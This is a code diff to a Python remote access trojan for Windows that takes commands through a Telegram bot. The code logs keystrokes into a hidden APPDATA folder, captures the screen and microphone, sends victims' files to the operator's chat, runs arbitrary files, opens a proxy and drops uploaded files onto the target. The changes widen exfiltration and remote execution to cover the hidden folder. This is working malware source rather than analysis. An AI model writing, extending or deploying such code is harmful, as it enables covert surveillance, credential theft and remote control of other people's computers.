@@ -1,12 +1,13 @@
 #!/usr/bin/env python
 from PIL import ImageGrab #/capture_pc
-from time import strftime, sleep
 from shutil import copyfile, copyfileobj, rmtree #/ls, /pwd, /cd /copy
-from sys import argv, path
+from sys import argv, path, stdout
 from json import loads
 from winshell import startup
 from tendo import singleton
 from win32com.client import Dispatch
+from time import strftime, sleep
+import time
 import threading
 import pyaudio, wave #/hear
 import telepot, requests
@@ -17,30 +18,9 @@ me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
 token = os.environ['RAT_TOKEN'] # you can set your environment variable as well
-
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
 known_ids = []
 known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
-
-# functionalities dictionary: command:arguments
-functionalities = { '/capture_pc' : '', \
-					'/cd':'<target_dir>', \
-					'/delete':'<target_file>', \
-					'/download':'<target_file>', \
-					'/hear':'[time in seconds, default=5s]', \
-					'/ip_info':'', \
-					'/keylogs':'', \
-					'/ls':'[target_folder]', \
-					'/msg_box':'<text>', \
-					'/pc_info':'', \
-					'/play':'<youtube_videoId>', \
-					'/proxy':'', \
-					'/pwd':'', \
-					'/run_file':'<target_file>', \
-					'/self_destruct':'', \
-					'/to':'<target_computer>, [other_target_computer]'}
-def checkchat_id(chat_id):
-	return len(known_ids) == 0 or str(chat_id) in known_ids
 appdata_roaming_folder = os.environ['APPDATA']	# = 'C:\Users\Username\AppData\Roaming'
 # HIDING OPTIONS
 # ---------------------------------------------
@@ -60,10 +40,30 @@ if not os.path.exists(hide_folder):
 initi = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 log_file = hide_folder + '\\keylogs.txt'
+# functionalities dictionary: command:arguments
+functionalities = { '/capture_pc' : '', \
+					'/cd':'<target_dir>', \
+					'/delete':'<target_file>', \
+					'/download':'<target_file>', \
+					'/hear':'[time in seconds, default=5s]', \
+					'/ip_info':'', \
+					'/keylogs':'', \
+					'/ls':'[target_folder]', \
+					'/msg_box':'<text>', \
+					'/pc_info':'', \
+					'/play':'<youtube_videoId>', \
+					'/proxy':'', \
+					'/pwd':'', \
+					'/run':'<target_file>', \
+					'/self_destruct':'', \
+					'/to':'<target_computer>, [other_target_computer]'}
+def checkchat_id(chat_id):
+	return len(known_ids) == 0 or str(chat_id) in known_ids
 with open(log_file, "a") as writing:
 	writing.write("-------------------------------------------------\n")
 	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
 def pressed_chars(event):
+	print event.Ascii
 	if event and type(event.Ascii) == int:
 		f = open(log_file,"a")
 		str = ''
@@ -77,15 +77,18 @@ def pressed_chars(event):
 			str += "<ESC>"
 		else:
 			str += chr(event.Ascii)
-		print str
+		if str.strip() == '':
+			print event.Ascii
+		else:
+			stdout.write(str)
 		if str.find('\x00') == -1:
 			f.write(str)
 	return True
 def handle(msg):
 	chat_id = msg['chat']['id']
-	print 'Got message from ' + str(chat_id) + ': ' + msg['text']
 	if checkchat_id(chat_id):
 		if 'text' in msg:
+			print 'Got message from ' + str(chat_id) + ': ' + msg['text']
 			command = msg['text']
 			response = ''
 			if command == '/capture_pc':
@@ -125,11 +128,15 @@ def handle(msg):
 				if path_file == '':
 					response = '/download C:/path/to/file.name or /download file.name'
 				else:
+					bot.sendChatAction(chat_id, 'upload_document')
 					try:
-						bot.sendChatAction(chat_id, 'upload_document')
 						bot.sendDocument(chat_id, open(path_file, 'rb'))
 					except:
-						response = 'Could not find ' + path_file
+						try:
+							bot.sendDocument(chat_id, open(hide_folder + '\\' + path_file))
+							response = 'Found in hide_folder: ' + hide_folder
+						except:
+							response = 'Could not find ' + path_file
 			elif command.startswith('/hear'):
 				SECONDS = -1
 				try:
@@ -216,18 +223,26 @@ def handle(msg):
 				threading.Thread(target=proxy.main).start()
 				info = requests.get('http://ipinfo.io').text #json format
 				ip = (loads(info)['ip'])
-				# response = 'Proxy succesfully setup on port ' + ip + ':80'
+				response = 'Proxy succesfully setup on ' + ip + ':8081'
 			elif command == '/pwd':
 				response = os.getcwd()
-			elif command.startswith('/run_file'):
+			elif command.startswith('/run'):
 				bot.sendChatAction(chat_id, 'typing')
-				path_file = command.replace('/run_file', '')
+				path_file = command.replace('/run', '')
 				path_file = path_file[1:]
 				if path_file == '':
 					response = '/run_file C:/path/to/file'
 				else:
-					os.startfile(path_file)
-					response = 'Command executed'
+					try:
+						os.startfile(path_file)
+						response = 'File ' + path_file + ' has been run'
+					except:
+						try:
+							os.startfile(hide_folder + '\\' + path_file)
+							response = 'File ' + path_file + ' has been run from hide_folder'
+						except:
+							response = 'File not found'
+					
 			elif command == '/self_destruct':
 				bot.sendChatAction(chat_id, 'typing')
 				global initi
@@ -264,14 +279,22 @@ def handle(msg):
 			if response != '':
 				bot.sendMessage(chat_id, response)
 		else: # Upload a file to target
-			file_name = msg['document']['file_name']
-			file_id = msg['document']['file_id']
+			file_name = ''
+			file_id = None
+			if 'document' in msg:
+				file_name = msg['document']['file_name']
+				file_id = msg['document']['file_id']
+			elif 'photo' in msg:
+				file_time = int(time.time())
+				file_id = msg['photo'][1]['file_id']
+				file_name = file_id + '.jpg'
 			file_path = bot.getFile(file_id=file_id)['file_path']
 			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
 			file = (requests.get(link, stream=True)).raw
 			with open(hide_folder + '\\' + file_name, 'wb') as out_file:
 				copyfileobj(file, out_file)
 			response = 'File received succesfully.'
+			
 bot = telepot.Bot(token)
 bot.message_loop(handle)
 if len(known_ids) > 0:
